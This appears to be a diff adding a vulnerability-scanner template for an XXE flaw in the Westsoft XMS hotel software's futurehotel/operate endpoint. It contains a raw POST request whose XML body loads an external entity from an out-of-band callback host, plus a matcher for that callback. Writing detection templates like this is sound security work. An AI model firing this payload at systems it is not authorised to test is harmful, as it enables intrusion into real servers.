@@ -1,0 +1,28 @@
+id: west-soft-xms-operate-xxe
+
+info:
+  name: Westsoft XMS operate - XML External Entity Injection
+  author: qwtd
+  severity: high
+  description: |
+    西软云XMS futurehotel/operate 接口存在XXE漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/%E8%A5%BF%E8%BD%AF%E4%BA%91/%E8%A5%BF%E8%BD%AF%E4%BA%91XMS-futurehotel-operate%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
+        Connection: close
+        Content-Type: text/xml
+        Accept-Encoding: gzip
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
